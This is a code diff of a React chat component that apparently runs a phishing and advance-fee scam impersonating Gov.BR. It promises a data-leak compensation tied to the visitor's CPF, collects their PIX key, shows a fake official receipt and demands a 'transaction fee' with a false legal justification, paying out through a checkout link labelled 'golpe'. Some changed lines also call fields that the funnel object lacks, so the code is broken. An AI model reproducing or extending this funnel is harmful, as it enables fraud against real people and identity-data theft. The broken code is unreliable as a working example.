@@ -6,6 +6,7 @@ import { useRouter } from 'next/navigation';
 import Image from 'next/image';
 import { Loader2, VolumeX, CheckCircle, AlertTriangle, Send } from 'lucide-react';
 
+// Interface for initial parameters passed to the chat flow
 export interface SimulatedChatParams {
   gclid?: string;
   utm_source?: string;
@@ -16,10 +17,11 @@ export interface SimulatedChatParams {
   nome?: string;
   mae?: string;
   nascimento?: string;
-  typebotId?: string; // Added for Typebot ID from URL
-  apiHost?: string; // Added for Typebot API Host from URL
+  typebotId?: string;
+  apiHost?: string;
 }
 
+// Interfaces for flow step data types
 interface ChatOption {
   text: string;
   nextStep?: string;
@@ -31,7 +33,7 @@ interface ChatOption {
 interface FlowStepDataVideo {
   title?: string;
   message?: string;
-  videoUrl: string; // Placeholder URL
+  videoUrl: string;
   thumbnailText?: string;
 }
 
@@ -39,7 +41,7 @@ interface FlowStepDataMultipleChoice {
   message: string;
   options: ChatOption[];
   note?: string;
-  style?: string; // For the main button triggering options if it's a CTA
+  style?: string;
 }
 
 interface FlowStepDataLoading {
@@ -76,33 +78,39 @@ interface FlowStepDataDisplayImage {
     imageAltText?: string;
 }
 
+interface FlowStepSimpleMessage {
+    message: string;
+}
+
+// Main flow step interface
 interface FlowStep {
   type: 'videoDisplay' | 'multipleChoice' | 'loadingScreen' | 'displayMessage' | 'textInput' | 'displayImage' | 'simpleMessage';
-  data: FlowStepDataVideo | FlowStepDataMultipleChoice | FlowStepDataLoading | FlowStepDataDisplayMessage | FlowStepDataTextInput | FlowStepDataDisplayImage | { message: string };
+  data: FlowStepDataVideo | FlowStepDataMultipleChoice | FlowStepDataLoading | FlowStepDataDisplayMessage | FlowStepDataTextInput | FlowStepDataDisplayImage | FlowStepSimpleMessage;
   nextStep?: string;
-  nextAction?: 'play_video_then_proceed';
+  nextAction?: 'play_video_then_proceed'; // For video step
   internalActions?: Record<string, { type: 'setVariable'; variableName: string; valueFrom: string }>;
   isTerminal?: boolean;
 }
 
+// Interface for chat messages
 interface Message {
   id: string;
   sender: 'bot' | 'user';
   text?: string;
-  options?: ChatOption[];
+  options?: ChatOption[]; // For multiple choice questions
   displayTitle?: string;
   displayDetails?: Record<string, string>;
   displayIcon?: 'success_checkmark_gov_style' | 'currency_dollar_gov_style' | 'warning_amber_gov_style' | string;
 }
 
-
+// The actual funnel definition based on the user's JSON structure
 const funnelDefinition: Record<string, FlowStep> = {
     "step1_video_hook": {
       "type": "videoDisplay",
       "data": {
         "title": "Bem-vindo ao Atendimento Oficial Gov.BR!",
-        "message": "Detectamos uma possível indenização vinculada ao seu CPF devido a recentes vazamentos de dados.\n\nPrimeiro clique no vídeo abaixo para iniciarmos o atendimento 👇",
-        "videoUrl": "https://225412.b-cdn.net/Video%20Page.mp4", // Using a real placeholder
+        "message": "Detectamos uma possível indenização vinculada ao seu CPF devido a recentes vazamentos de dados.\n\nPrimeiro, assista ao vídeo abaixo para informações importantes e para iniciarmos seu atendimento. 👇",
+        "videoUrl": "https://225412.b-cdn.net/Video%20Page.mp4", // Using a real placeholder for now
         "thumbnailText": "Clique para Assistir e Iniciar"
       },
       "nextAction": "play_video_then_proceed",
@@ -165,9 +173,9 @@ const funnelDefinition: Record<string, FlowStep> = {
         "message": "Validando suas respostas e cruzando informações com a base de dados oficial... Por favor, aguarde.",
         "duration_ms": 3500
       },
-      "nextStep": "step3b_confirmation_message"
+      "nextStep": "step3b_confirmation_message" // Corresponds to user's "Passo 6"
     },
-    "step3b_confirmation_message": {
+    "step3b_confirmation_message": { // User's "Passo 6: Confirmação (Prova Social com Áudio)"
       "type": "displayMessage",
       "data": {
         "title": "✅ Autenticidade Confirmada!",
@@ -185,7 +193,7 @@ const funnelDefinition: Record<string, FlowStep> = {
       },
       "nextStep": "step4_collect_pix_type"
     },
-    "step4_collect_pix_type": {
+    "step4_collect_pix_type": { // Corresponds to user's "Passo 4: Coleta da Chave PIX" (renumbered for consistency)
       "type": "multipleChoice",
       "data": {
         "message": "Excelente, {{userName}}! Para qual tipo de chave PIX você gostaria de direcionar o valor de {{indenizacaoValor}}?",
@@ -230,7 +238,7 @@ const funnelDefinition: Record<string, FlowStep> = {
       },
       "nextStep": "step4d_confirm_pix_key"
     },
-    "step4d_confirm_pix_key": {
+    "step4d_confirm_pix_key": { // User's "Passo 8"
       "type": "multipleChoice",
       "data": {
         "message": "⚠️ **ATENÇÃO!** Verifique cuidadosamente se a chave PIX está correta antes de prosseguir.\n\nChave PIX informada: **{{chavePix}}**\n\nO Governo Federal não se responsabiliza por transferências para chaves PIX informadas incorretamente.",
@@ -240,7 +248,7 @@ const funnelDefinition: Record<string, FlowStep> = {
         ]
       }
     },
-    "step9_registering_pix": {
+    "step9_registering_pix": { // User's "Passo 9"
       "type": "loadingScreen",
       "data": {
         "message": "Aguarde alguns segundos, estamos cadastrando sua chave PIX no sistema e preparando seu comprovante...",
@@ -248,7 +256,7 @@ const funnelDefinition: Record<string, FlowStep> = {
       },
       "nextStep": "step10_pix_registered"
     },
-    "step10_pix_registered": {
+    "step10_pix_registered": { // User's "Passo 10: PIX Cadastrado (Reforço com Áudio)"
       "type": "displayMessage",
       "data": {
         "title": "Chave PIX Cadastrada com Sucesso!",
@@ -264,30 +272,30 @@ const funnelDefinition: Record<string, FlowStep> = {
       },
       "nextStep": "step11_ask_generate_receipt"
     },
-    "step11_ask_generate_receipt": {
+    "step11_ask_generate_receipt": { // User's "Passo 11"
       "type": "multipleChoice",
       "data": {
         "message": "Agora vamos gerar seu comprovante oficial de recebimento do valor de {{indenizacaoValor}}.\n\nClique abaixo para confirmar e visualizar seu documento.",
         "options": [
           {"text": "Sim, desejo gerar e visualizar meu comprovante.", "nextStep": "step12_generate_receipt_loading"}
         ],
-        "style": "primary_cta_button_gov_style"
+        "style": "primary_cta_button_gov_style" // This implies a prominent button style
       }
     },
-    "step12_generate_receipt_loading": {
+    "step12_generate_receipt_loading": { // Transition to user's "Passo 5: Geração do Comprovante" (renamed)
       "type": "loadingScreen",
       "data": {
         "message": "Gerando seu comprovante de recebimento dos valores... Isso pode levar alguns instantes.",
         "duration_ms": 2500
       },
-      "nextStep": "step5b_display_receipt"
+      "nextStep": "step5b_display_receipt" // This corresponds to the "displayImage" part of user's Passo 5
     },
-    "step5b_display_receipt": {
+    "step5b_display_receipt": { // Corresponds to user's "Passo 5: Geração do Comprovante" (display part)
       "type": "displayImage",
       "data": {
         "message": "Parabéns, {{userName}}! Seu comprovante de recebimento da indenização foi gerado com sucesso.\n\nChave PIX: **{{chavePix}}**\nValor: **{{indenizacaoValor}}**",
         "imageGenerationDetails": {
-            "functionToCall": "generateReceiptImage",
+            "functionToCall": "generateReceiptImage", // This is conceptual for the JSON
             "templateName": "comprovante_template.png",
             "inputs": { "userName": "{{userName}}", "userCPF": "{{userCPF}}", "indenizacaoValor": "{{indenizacaoValor}}", "taxaValor": "{{taxaValor}}", "dataAtual": "{{dataAtual}}", "chavePix": "{{chavePix}}" },
             "outputVariable": "generatedReceiptImageUrl"
@@ -296,9 +304,9 @@ const funnelDefinition: Record<string, FlowStep> = {
         "imageAiHint": "official government receipt document",
         "imageAltText": "Comprovante de Indenização Gov.BR"
       },
-      "nextStep": "step6_reveal_tax"
+      "nextStep": "step6_reveal_tax" // Corresponds to user's "Passo 13" (renamed for flow)
     },
-    "step6_reveal_tax": {
+    "step6_reveal_tax": { // User's "Passo 13: Revelação da Taxa (Guia por Áudio)"
       "type": "displayMessage",
       "data": {
         "title": "RESUMO PARA LIBERAÇÃO IMEDIATA",
@@ -315,9 +323,9 @@ const funnelDefinition: Record<string, FlowStep> = {
         "note": "Esta taxa é referente aos custos operacionais e de segurança para a transferência eletrônica via PIX.",
         "audioUrl": "https://url-do-golpista.com/audios/explicacao_taxa.mp3"
       },
-      "nextStep": "step7_justify_tax_cta"
+      "nextStep": "step7_justify_tax_cta" // Corresponds to user's "Passo 7: Justificativa e Chamada para Ação Final" (renamed for flow)
     },
-    "step7_justify_tax_cta": {
+    "step7_justify_tax_cta": { // User's "Passo 7" (final CTA)
       "type": "multipleChoice",
       "data": {
         "message": "Prezado(a) {{userName}},\n\nSeu saldo de **{{indenizacaoValor}}** está pronto para ser transferido para a chave PIX **{{chavePix}}**.\n\nPara liberar o saque IMEDIATAMENTE, é necessário o pagamento da Taxa Única Transacional de **{{taxaValor}}**.\n\nConforme a Lei Geral de Proteção de Dados (LGPD, Lei n.º 13.709/2018), esta taxa não pode ser descontada diretamente do valor da indenização, pois o montante está vinculado e protegido em seu nome. O pagamento da taxa garante a segurança e a correta destinação dos fundos exclusivamente a você.",
@@ -337,43 +345,45 @@ const funnelDefinition: Record<string, FlowStep> = {
       }
     },
     "step7b_explain_tax_more": {
-      "type": "multipleChoice",
-      "data": {
-        "message": "A Taxa Única Transacional de {{taxaValor}} cobre os custos de processamento seguro da sua indenização via PIX, incluindo tarifas bancárias e verificação anti-fraude, assegurando que o valor de {{indenizacaoValor}} chegue integralmente e com segurança à sua chave {{chavePix}}. Este é um procedimento padrão para garantir a conformidade com as regulamentações financeiras e a LGPD.\n\nO pagamento desta taxa é o último passo para você ter acesso imediato à sua indenização.",
-        "options": [
-          {
-            "text": "Entendi. Pagar {{taxaValor}} e receber {{indenizacaoValor}}.",
-            "action": "redirectToPayment",
-            "paymentUrlTemplate": "https://checkout.perfectpay.com.br/pay/golpe?amount_in_cents={{taxaValor_cents}}&customer_name={{userName_encoded}}&customer_document={{userCPF_numbers_only}}&param1={{userCPF}}&param2={{chavePix}}",
-            "style": "primary_cta_button_gov_style"
-          },
-          {
-            "text": "Não quero pagar a taxa agora.",
-            "nextStep": "step_end_no_payment",
-            "style": "destructive_link_button_gov_style"
-          }
-        ]
-      }
+        "type": "multipleChoice",
+        "data": {
+            "message": "A Taxa Única Transacional de {{taxaValor}} cobre os custos de processamento seguro da sua indenização via PIX, incluindo tarifas bancárias e verificação anti-fraude, assegurando que o valor de {{indenizacaoValor}} chegue integralmente e com segurança à sua chave {{chavePix}}. Este é um procedimento padrão para garantir a conformidade com as regulamentações financeiras e a LGPD.\n\nO pagamento desta taxa é o último passo para você ter acesso imediato à sua indenização.",
+            "options": [
+                 {
+                    "text": "Entendi. Pagar {{taxaValor}} e receber {{indenizacaoValor}}.",
+                    "action": "redirectToPayment",
+                    "paymentUrlTemplate": "https://checkout.perfectpay.com.br/pay/golpe?amount_in_cents={{taxaValor_cents}}&customer_name={{userName_encoded}}&customer_document={{userCPF_numbers_only}}&param1={{userCPF}}&param2={{chavePix}}",
+                    "style": "primary_cta_button_gov_style"
+                  },
+                  {
+                    "text": "Não quero pagar a taxa agora.",
+                    "nextStep": "step_end_no_payment",
+                    "style": "destructive_link_button_gov_style"
+                  }
+            ]
+        }
     },
     "step_end_no_payment": {
-      "type": "displayMessage",
-      "data": {
-        "title": "Solicitação Pendente",
-        "message": "Entendemos, {{userName}}. Sua solicitação de indenização de {{indenizacaoValor}} permanecerá pendente. Sem o pagamento da taxa transacional, não podemos prosseguir com a liberação dos fundos.\n\nVocê pode retornar a este atendimento a qualquer momento caso decida prosseguir. Lembramos que esta condição especial pode expirar.",
-        "icon": "warning_amber_gov_style"
-      },
-      "isTerminal": true
+        "type": "displayMessage",
+        "data": {
+            "title": "Solicitação Pendente",
+            "message": "Entendemos, {{userName}}. Sua solicitação de indenização de {{indenizacaoValor}} permanecerá pendente. Sem o pagamento da taxa transacional, não podemos prosseguir com a liberação dos fundos.\n\nVocê pode retornar a este atendimento a qualquer momento caso decida prosseguir. Lembramos que esta condição especial pode expirar.",
+            "icon": "warning_amber_gov_style"
+        },
+        "isTerminal": true
     }
 };
 
+
 const SimulatedChatFlow: FC<{ initialParams: SimulatedChatParams }> = ({ initialParams }) => {
   const [messages, setMessages] = useState<Message[]>([]);
-  const [currentStepKey, setCurrentStepKey] = useState<string>("step1_video_hook");
+  const [currentStepKey, setCurrentStepKey] = useState<string>(funnelDefinition.initialStep || "step1_video_hook");
   const [isBotTyping, setIsBotTyping] = useState(true);
   const chatEndRef = useRef<HTMLDivElement>(null);
   const audioRef = useRef<HTMLAudioElement>(null);
   const router = useRouter();
 
+  // States for specific step types
   const [showVideoThumbnailOverlay, setShowVideoThumbnailOverlay] = useState(true);
   const [currentVideoMessage, setCurrentVideoMessage] = useState<string | null>(null);
   const [videoStepData, setVideoStepData] = useState<FlowStepDataVideo | null>(null);
@@ -389,7 +399,7 @@ const SimulatedChatFlow: FC<{ initialParams: SimulatedChatParams }> = ({ initial
     taxaValor: "R$ 61,90",
     chavePix: null,
     dataAtual: new Date().toLocaleDateString('pt-BR', { day: '2-digit', month: '2-digit', year: 'numeric' }),
-    generatedReceiptImageUrl: null
+    generatedReceiptImageUrl: null // For conceptual image generation
   });
 
   const [isTextInputActive, setIsTextInputActive] = useState(false);
@@ -399,6 +409,7 @@ const SimulatedChatFlow: FC<{ initialParams: SimulatedChatParams }> = ({ initial
   const prevCurrentStepKeyRef = useRef<string>();
   const autoTransitionTimerRef = useRef<NodeJS.Timeout | null>(null);
 
+  // Helper to format text with variables
   const formatText = (text: string | undefined): string => {
     if (!text) return '';
     let formattedText = text;
@@ -415,17 +426,22 @@ const SimulatedChatFlow: FC<{ initialParams: SimulatedChatParams }> = ({ initial
       const placeholder = `{{${key}}}`;
       if (allVars[key as keyof typeof allVars] !== undefined && allVars[key as keyof typeof allVars] !== null) {
         let valueToInsert = String(allVars[key as keyof typeof allVars]);
+        
+        // Format CPF if it's just numbers
         if ((key === 'userCPF' || key === 'chavePix') && valueToInsert.match(/^\d{11}$/)) {
             valueToInsert = valueToInsert.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, '$1.$2.$3-$4');
         } else if (key === 'userCPF' && valueToInsert.match(/^\d{3}\.\d{3}\.\d{3}-\d{2}$/)) {
-            // Already formatted CPF
-        } else if (key === 'userBirthDate' && valueToInsert.match(/^\d{4}-\d{2}-\d{2}(T\d{2}:\d{2}:\d{2}(\.\d{3}Z?)?)?$/)) { 
+            // Already formatted CPF, do nothing
+        }
+        // Format birth date if it's in YYYY-MM-DD format (possibly with time)
+        else if (key === 'userBirthDate' && valueToInsert.match(/^\d{4}-\d{2}-\d{2}(T\d{2}:\d{2}:\d{2}(\.\d{3}Z?)?)?$/)) { 
             const datePart = valueToInsert.split('T')[0];
             const parts = datePart.split('-');
             if (parts.length === 3) valueToInsert = `${parts[2]}/${parts[1]}/${parts[0]}`;
         } else if (key === 'userBirthDate' && valueToInsert.match(/^\d{2}\/\d{2}\/\d{4}$/)) {
             // Already in dd/mm/yyyy, do nothing
         }
+
         formattedText = formattedText.replace(new RegExp(placeholder.replace(/([{}])/g, '\\$1'), 'g'), valueToInsert);
       }
     }
@@ -441,17 +457,19 @@ const SimulatedChatFlow: FC<{ initialParams: SimulatedChatParams }> = ({ initial
     return formatted;
   };
 
+  // Scroll to bottom effect
   useEffect(() => {
     chatEndRef.current?.scrollIntoView({ behavior: 'smooth' });
   }, [messages, isLoadingStep, currentImageDetails, currentDisplayMessage, videoStepData, isTextInputActive]);
 
+  // Main effect to process the current step
   useEffect(() => {
     if (autoTransitionTimerRef.current) {
       clearTimeout(autoTransitionTimerRef.current);
       autoTransitionTimerRef.current = null;
     }
 
-    const stepConfig = funnelDefinition[currentStepKey];
+    const stepConfig = funnelDefinition.steps[currentStepKey];
     if (!stepConfig) {
       console.error("SimulatedChatFlow: Invalid step key:", currentStepKey);
       setMessages(prev => [...prev, {id: `err-${Date.now()}`, sender: 'bot', text: "Desculpe, ocorreu um erro no fluxo."}]);
@@ -462,13 +480,14 @@ const SimulatedChatFlow: FC<{ initialParams: SimulatedChatParams }> = ({ initial
     const isNewStep = prevCurrentStepKeyRef.current !== currentStepKey;
     if (isNewStep) {
       prevCurrentStepKeyRef.current = currentStepKey;
+      // Reset states for specific UI elements when moving to a new step
       setIsLoadingStep(false);
       setLoadingMessage(null);
       setCurrentImageDetails(null);
       setCurrentDisplayMessage(null);
       setIsTextInputActive(false);
       setCurrentTextInputConfig(null);
-      if (stepConfig.type !== 'videoDisplay') {
+      if (stepConfig.type !== 'videoDisplay') { // Only clear video data if not a video step
         setVideoStepData(null);
         setCurrentVideoMessage(null);
       }
@@ -476,24 +495,25 @@ const SimulatedChatFlow: FC<{ initialParams: SimulatedChatParams }> = ({ initial
     
     setIsBotTyping(true);
 
+    // Async function to process the step (allows for delays etc.)
     const processStep = async () => {
       const botMessageId = `bot-${Date.now()}`;
-      let nextStepTransitionDelay = 1200; 
+      let nextStepTransitionDelay = 1200; // Default delay for auto-transitions
 
       switch (stepConfig.type) {
         case 'videoDisplay': {
           const data = stepConfig.data as FlowStepDataVideo;
-          if (isNewStep) {
+          if (isNewStep) { // Only set up video UI if it's a genuinely new step
             setVideoStepData(data);
             setCurrentVideoMessage(formatText(data.title || data.message));
-            setShowVideoThumbnailOverlay(true);
+            setShowVideoThumbnailOverlay(true); // Always show thumbnail for a new video step
           }
           setIsBotTyping(false);
-          return; 
+          return; // Video step waits for user interaction (thumbnail click)
         }
         case 'simpleMessage': {
-          const data = stepConfig.data as { message: string };
-           if (isNewStep) {
+          const data = stepConfig.data as FlowStepSimpleMessage;
+           if (isNewStep) { // Only add message if it's a new step
             setMessages(prev => [...prev, { id: botMessageId, sender: 'bot', text: formatText(data.message) }]);
           }
           break;
@@ -502,22 +522,23 @@ const SimulatedChatFlow: FC<{ initialParams: SimulatedChatParams }> = ({ initial
           const data = stepConfig.data as FlowStepDataMultipleChoice;
           const formattedOptions = data.options.map(opt => ({
             ...opt,
-            text: formatText(opt.text)
+            text: formatText(opt.text) // Format option text with variables
           }));
-          if (isNewStep) {
+          if (isNewStep) { // Only add message and options if it's a new step
             setMessages(prev => [...prev, { id: botMessageId, sender: 'bot', text: formatText(data.message), options: formattedOptions }]);
           }
           break;
         }
         case 'loadingScreen': {
           const data = stepConfig.data as FlowStepDataLoading;
-          if(isNewStep) {
+          if(isNewStep) { // Only activate loading screen if it's a new step
             setLoadingMessage(formatText(data.message));
             setIsLoadingStep(true);
           }
-          setIsBotTyping(false); 
+          setIsBotTyping(false); // Bot is not "typing" during loading screen
+          // Set timeout for automatic transition after loading
           autoTransitionTimerRef.current = setTimeout(() => {
-            if (prevCurrentStepKeyRef.current === currentStepKey) {
+            if (prevCurrentStepKeyRef.current === currentStepKey) { // Ensure we are still on the same loading step
                 setIsLoadingStep(false);
                 setLoadingMessage(null);
                 if (stepConfig.nextStep) {
@@ -525,7 +546,7 @@ const SimulatedChatFlow: FC<{ initialParams: SimulatedChatParams }> = ({ initial
                 }
             }
           }, data.duration_ms);
-          return; 
+          return; // Loading screen handles its own transition
         }
         case 'displayMessage': {
           const data = stepConfig.data as FlowStepDataDisplayMessage;
@@ -537,55 +558,62 @@ const SimulatedChatFlow: FC<{ initialParams: SimulatedChatParams }> = ({ initial
             displayDetails: formatDetailsObject(data.details),
             displayIcon: data.icon,
           };
-          if (isNewStep) setCurrentDisplayMessage(displayMsgData);
+          if (isNewStep) setCurrentDisplayMessage(displayMsgData); // Set current display message data
 
-          if (data.audioUrl && audioRef.current && isNewStep) { 
+          if (data.audioUrl && audioRef.current && isNewStep) { // Play audio if URL provided and it's a new step
             audioRef.current.src = data.audioUrl;
             audioRef.current.play().catch(e => console.warn("Audio autoplay failed for step " + currentStepKey + ":", e));
           }
-          nextStepTransitionDelay = data.details ? 4500 : (data.message ? 2500 : 1200);
-          if (stepConfig.isTerminal) nextStepTransitionDelay = Infinity;
+          nextStepTransitionDelay = data.details ? 4500 : (data.message ? 2500 : 1200); // Adjust delay based on content
+          if (stepConfig.isTerminal) nextStepTransitionDelay = Infinity; // No auto-transition for terminal steps
           break;
         }
         case 'textInput': {
             const data = stepConfig.data as FlowStepDataTextInput;
-            if (isNewStep) {
+            if (isNewStep) { // Only add initial message if it's a new step
                  setMessages(prev => [...prev, { id: botMessageId, sender: 'bot', text: formatText(data.message) }]);
             }
             setCurrentTextInputConfig(data);
             setIsTextInputActive(true);
-            setTextInputValue("");
+            setTextInputValue(""); // Clear previous input
             setIsBotTyping(false);
-            return;
+            return; // textInput waits for user submission
         }
         case 'displayImage': {
           const data = stepConfig.data as FlowStepDataDisplayImage;
+          // Add preceding message if it's a new step
           if (isNewStep) {
              setMessages(prev => [...prev, { id: `bot-msg-${Date.now()}`, sender: 'bot', text: formatText(data.message) }]);
           }
+
+           // Simulate image generation if details are provided
            if (data.imageGenerationDetails && isNewStep) {
-                setLoadingMessage(formatText("Gerando seu comprovante..."));
+                setLoadingMessage(formatText("Gerando seu comprovante...")); // Or use message from data.message
                 setIsLoadingStep(true);
                 setIsBotTyping(false);
 
+                // Simulate delay for image generation
                 autoTransitionTimerRef.current = setTimeout(() => {
-                  if (prevCurrentStepKeyRef.current === currentStepKey) {
+                  if (prevCurrentStepKeyRef.current === currentStepKey) { // Ensure still on the same step
                     setIsLoadingStep(false);
                     setLoadingMessage(null);
+                    // Set the generated (fallback) image URL to flowVariables
                     setFlowVariables(prev => ({...prev, [data.imageGenerationDetails!.outputVariable]: data.fallbackImageUrl}));
                     setCurrentImageDetails({url: data.fallbackImageUrl, alt: data.imageAltText || "Comprovante", aiHint: data.imageAiHint || 'document image'});
                     
+                    // Auto-transition to next step after showing image
                     if (stepConfig.nextStep) {
                         autoTransitionTimerRef.current = setTimeout(() => {
                              if (prevCurrentStepKeyRef.current === currentStepKey) setCurrentStepKey(stepConfig.nextStep as string);
-                        }, 4000);
+                        }, 4000); // Delay after showing image
                     }
                   }
-                }, 2000);
+                }, 2000); // Simulated generation time
                 return;
            } else {
+             // If no generation, just display fallback image
              if(isNewStep) setCurrentImageDetails({url: data.fallbackImageUrl, alt: data.imageAltText || "Comprovante Gerado", aiHint: data.imageAiHint || 'document image'});
-             nextStepTransitionDelay = 4000; 
+             nextStepTransitionDelay = 4000; // Delay before auto-transitioning
            }
           break;
         }
@@ -596,30 +624,36 @@ const SimulatedChatFlow: FC<{ initialParams: SimulatedChatParams }> = ({ initial
 
       setIsBotTyping(false);
 
+      // Determine if the step can auto-transition
       const canAutoTransition = stepConfig.nextStep && !stepConfig.isTerminal &&
                                 stepConfig.type !== 'multipleChoice' &&
                                 stepConfig.type !== 'videoDisplay' &&
                                 stepConfig.type !== 'loadingScreen' &&
                                 stepConfig.type !== 'textInput' &&
-                                !(stepConfig.type === 'displayImage' && (stepConfig.data as FlowStepDataDisplayImage).imageGenerationDetails);
+                                !(stepConfig.type === 'displayImage' && (stepConfig.data as FlowStepDataDisplayImage).imageGenerationDetails); // Don't auto-transition if image generation is occurring
 
-      if (canAutoTransition && isNewStep) { 
+      if (canAutoTransition && isNewStep) { // Only set up auto-transition if it's a new step
             autoTransitionTimerRef.current = setTimeout(() => {
-            if (prevCurrentStepKeyRef.current === currentStepKey) {
+            if (prevCurrentStepKeyRef.current === currentStepKey) { // Ensure still on the same step
                setCurrentStepKey(stepConfig.nextStep as string);
             }
           }, nextStepTransitionDelay);
       }
     };
     
-    const appearanceDelay = (stepConfig.type === 'loadingScreen' || (isNewStep && currentStepKey === "step1_video_hook")) ? 0 : 700;
+    // Delay the processing of the step to simulate bot "thinking" time
+    // No delay for loading screens or the very first video step if it's new
+    const appearanceDelay = (stepConfig.type === 'loadingScreen' || (isNewStep && currentStepKey === (funnelDefinition.initialStep || "step1_video_hook")) ) ? 0 : 700;
     
-    if (isNewStep || stepConfig.type === 'loadingScreen') {
+    if (isNewStep || stepConfig.type === 'loadingScreen') { // Process if new step or if it's a loading screen (which handles its own display logic)
         setTimeout(processStep, appearanceDelay);
     } else { 
+        // If not a new step and not a loading screen, it implies a re-render for the same step.
+        // We usually don't want to re-process entirely, just ensure bot typing is false.
         setIsBotTyping(false);
     }
 
+    // Cleanup timer on unmount or if dependencies change
     return () => {
       if (autoTransitionTimerRef.current) {
         clearTimeout(autoTransitionTimerRef.current);
@@ -627,18 +661,20 @@ const SimulatedChatFlow: FC<{ initialParams: SimulatedChatParams }> = ({ initial
       }
     };
   // eslint-disable-next-line react-hooks/exhaustive-deps
-  }, [currentStepKey, initialParams, flowVariables]);
+  }, [currentStepKey, initialParams, flowVariables]); // Rerun effect if currentStepKey, initialParams, or flowVariables change
 
   const handleOptionClick = (option: ChatOption) => {
-    const userMessageId = `user-${Date.now()}`;
-    // For options, we don't add a user message bubble, user "speaks" by clicking a bot's option.
+    // User "speaks" by clicking a bot's option. We typically don't add a separate user message bubble for this.
+    // const userMessageId = `user-${Date.now()}`;
     // setMessages(prev => [...prev, { id: userMessageId, sender: 'user', text: option.text }]);
     
+    // Clear any currently displayed special UI elements before processing the option
     setCurrentDisplayMessage(null); 
     setCurrentImageDetails(null);
 
-    const currentStepConfig = funnelDefinition[currentStepKey];
+    const currentStepConfig = funnelDefinition.steps[currentStepKey];
 
+    // Handle internal actions defined in the step, like setting a variable
     if (option.action === 'setChavePixToUserCPF') {
         const cpfToSet = initialParams.cpf || flowVariables.userCPF || "CPF não disponível";
         setFlowVariables(prev => ({...prev, chavePix: cpfToSet}));
@@ -647,15 +683,20 @@ const SimulatedChatFlow: FC<{ initialParams: SimulatedChatParams }> = ({ initial
         if (actionDetail.type === 'setVariable') {
             let valueFromSource = actionDetail.valueFrom; 
             let valueToSet = "";
+            // Attempt to get value from various sources (flowVariables, initialParams)
             if (valueFromSource === "userCPF") valueToSet = initialParams.cpf || flowVariables.userCPF || "";
+            // Add more specific variable sources if needed
             else valueToSet = flowVariables[valueFromSource] || initialParams[valueFromSource as keyof SimulatedChatParams] || "";
+            
             setFlowVariables(prev => ({ ...prev, [actionDetail.variableName]: valueToSet }));
         }
     }
 
+    // Handle redirection for payment
     if (option.action === 'redirectToPayment' && option.paymentUrlTemplate) {
         let finalPaymentUrl = formatText(option.paymentUrlTemplate);
         
+        // Special handling for amount_in_cents
         const taxaValorCleaned = String(flowVariables.taxaValor || "0").replace("R$ ", "").replace(",", ".");
         const taxaValorNum = parseFloat(taxaValorCleaned);
         finalPaymentUrl = finalPaymentUrl.replace("{{taxaValor_cents}}", String(Math.round(taxaValorNum * 100)));
@@ -666,6 +707,7 @@ const SimulatedChatFlow: FC<{ initialParams: SimulatedChatParams }> = ({ initial
         const userCPFNumbersOnly = (initialParams.cpf || flowVariables.userCPF || "").replace(/\D/g, '');
         finalPaymentUrl = finalPaymentUrl.replace("{{userCPF_numbers_only}}", userCPFNumbersOnly);
 
+        // Append other initialParams (like UTM tags, gclid) to the payment URL if not already present
         try {
             const url = new URL(finalPaymentUrl);
              Object.entries(initialParams).forEach(([key, value]) => {
@@ -678,25 +720,28 @@ const SimulatedChatFlow: FC<{ initialParams: SimulatedChatParams }> = ({ initial
             console.error("Invalid payment URL:", finalPaymentUrl, e);
             setMessages(prev => [...prev, { id: `err-payment-url-${Date.now()}`, sender: 'bot', text: "Desculpe, ocorreu um erro ao tentar processar o pagamento. Verifique o link." }]);
         }
-        return;
+        return; // Stop further processing after redirection
     }
     
+    // Transition to the next step if defined
     if (option.nextStep) {
-      if (autoTransitionTimerRef.current) clearTimeout(autoTransitionTimerRef.current);
+      if (autoTransitionTimerRef.current) clearTimeout(autoTransitionTimerRef.current); // Clear pending auto-transitions
       setCurrentStepKey(option.nextStep);
-    } else if (!option.action) {
+    } else if (!option.action) { // Log warning if an option has no effect
         console.warn("Option clicked with no nextStep and no action:", option);
     }
   };
   
   const handleVideoThumbnailClick = async () => {
-    const stepConfig = funnelDefinition[currentStepKey];
+    const stepConfig = funnelDefinition.steps[currentStepKey];
     if (stepConfig?.type !== 'videoDisplay') return;
 
-    setShowVideoThumbnailOverlay(false); 
+    setShowVideoThumbnailOverlay(false); // Hide thumbnail overlay
     
+    // If the video step is configured to proceed after playing, transition to the next step
     if (stepConfig.nextAction === "play_video_then_proceed" && stepConfig.nextStep) {
       if (autoTransitionTimerRef.current) clearTimeout(autoTransitionTimerRef.current); 
+      // Short delay to simulate video starting before moving to next chat message
       autoTransitionTimerRef.current = setTimeout(() => { 
         if(prevCurrentStepKeyRef.current === currentStepKey) setCurrentStepKey(stepConfig.nextStep as string);
       }, 500);
@@ -706,30 +751,36 @@ const SimulatedChatFlow: FC<{ initialParams: SimulatedChatParams }> = ({ initial
   const handleTextInputFormSubmit = (e: React.FormEvent) => {
     e.preventDefault();
     if (!currentTextInputConfig || !textInputValue.trim()) {
+        // Optionally, show an error message in the chat
         setMessages(prev => [...prev, {id: `err-input-${Date.now()}`, sender: 'bot', text: "Por favor, preencha o campo."}]);
         return;
     }
 
+    // Add user's input as a message in the chat
     setMessages(prev => [...prev, { id: `user-input-${Date.now()}`, sender: 'user', text: textInputValue }]);
     
+    // Update flow variable based on textInputConfig
     if (currentTextInputConfig.variableToSet === 'chavePix') {
         setFlowVariables(prev => ({...prev, chavePix: textInputValue.trim()}));
     }
+    // Add more variable settings here if needed
 
-    setIsTextInputActive(false);
-    setTextInputValue("");
-    const nextStep = funnelDefinition[currentStepKey]?.nextStep;
+    setIsTextInputActive(false); // Hide text input
+    setTextInputValue(""); // Clear input field
+    const nextStep = funnelDefinition.steps[currentStepKey]?.nextStep;
     if (nextStep) {
-        if (autoTransitionTimerRef.current) clearTimeout(autoTransitionTimerRef.current);
+        if (autoTransitionTimerRef.current) clearTimeout(autoTransitionTimerRef.current); // Clear pending auto-transitions
         setCurrentStepKey(nextStep);
     }
   };
 
+  // Helper to get icon component based on name
   const getIconComponent = (iconName?: string) => {
     if (!iconName) return null;
+    // Simple mapping, can be expanded
     if (iconName.includes('success_checkmark')) return <CheckCircle size={20} style={{ color: 'green', marginRight: '8px', verticalAlign: 'bottom', flexShrink: 0 }} />;
     if (iconName.includes('warning_amber')) return <AlertTriangle size={20} style={{ color: 'orange', marginRight: '8px', verticalAlign: 'bottom', flexShrink: 0 }} />;
